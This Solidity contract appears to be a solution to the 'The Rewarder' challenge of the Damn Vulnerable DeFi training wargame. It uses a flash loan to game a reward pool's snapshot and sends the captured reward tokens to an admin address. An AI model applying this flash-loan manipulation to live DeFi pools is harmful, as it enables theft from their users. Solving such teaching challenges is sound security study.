// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract Attacker {
    address private admin;
    FlashLoanerPool private flashloanPool;
    TheRewarderPool private rewardPool;
    DamnValuableToken private dvt;
    RewardToken private rewardToken;

    constructor(
        address _admin,
        address _flashloanPool,
        address _rewardPool,
        address _dvt,
        address _rewardToken
    ) {
        admin = _admin;
        flashloanPool = FlashLoanerPool(_flashloanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        dvt = DamnValuableToken(_dvt);
        rewardToken = RewardToken(_rewardToken);
    }

    function goFlashloan(uint256 loan) external {
        flashloanPool.flashLoan(loan);
        uint256 rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(admin, rewards);
    }

    function receiveFlashLoan(uint256 loan) external {
        dvt.approve(address(rewardPool), loan);
        rewardPool.deposit(loan);
        rewardPool.withdraw(loan);
        dvt.transfer(address(flashloanPool), loan);
    }
}
